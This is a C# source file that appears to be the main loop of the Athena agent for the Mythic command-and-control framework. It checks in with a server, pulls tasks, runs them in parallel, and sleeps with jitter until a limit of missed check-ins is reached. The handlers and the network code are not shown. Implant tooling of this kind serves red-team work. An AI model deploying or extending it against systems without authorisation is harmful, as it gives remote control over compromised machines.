using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System.Diagnostics;

namespace Athena
{

    class Program
    {
        /// <summary>
        /// Main loop
        /// </summary>
        static void Main(string[] args)
        {
            AsyncMain().GetAwaiter().GetResult();
        }
        
        /// <summary>
        /// Main Loop (Async)
        /// </summary>
        static async Task AsyncMain() 
        { 
            int maxMissedCheckins = 10;
            int missedCheckins = 0;

            //MythicClient controls all of the agent communications
            AthenaClient ac = new AthenaClient();
            //First Checkin-In attempt
            CheckinResponse res = await ac.handleCheckin();
            
            if (!await ac.updateAgentInfo(res))
            {
                Debug.WriteLine($"[{DateTime.Now}] Failed to update agent info, exiting.");
                Environment.Exit(0);
            }

            //We checked in successfully, reset to 0
            missedCheckins = 0;

            //Main Loop
            while (missedCheckins != maxMissedCheckins)
            {
                try
                {
                    Debug.WriteLine($"[{DateTime.Now}] Beginning task loop, requesting tasks.");
                    List<MythicTask> tasks = await ac.GetTasks();
                    Debug.WriteLine($"[{DateTime.Now}] Received {tasks.Count} tasks.");
                    if (ac.exit)
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Exit requested.");
                        Environment.Exit(0);
                    }

                    if(tasks is null)
                    {
                        missedCheckins++;
                        if (missedCheckins == maxMissedCheckins)
                        {
                            Debug.WriteLine($"[{DateTime.Now}] Hit max checkins, exiting.");
                            Environment.Exit(0);
                        }
                    }
                    else
                    {
                        Parallel.ForEach(tasks, async c =>
                        {
                            Debug.WriteLine($"[{DateTime.Now}] Executing task with ID: {c.id}");
                            Task.Run(() => ac.commandHandler.StartJob(c));
                        });
                    }
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e.ToString());
                    missedCheckins++;
                    if (missedCheckins == maxMissedCheckins)
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Hit max checkins, exiting.");
                        Environment.Exit(0);
                    }
                    Debug.WriteLine($"[{DateTime.Now}] Max checkins not hit, continuing loop.");
                }
                Debug.WriteLine($"[{DateTime.Now}] Sleeping.");
                await Task.Delay(await Misc.GetSleep(ac.currentConfig.sleep, ac.currentConfig.jitter) * 1000);
            }
        }
    }
}
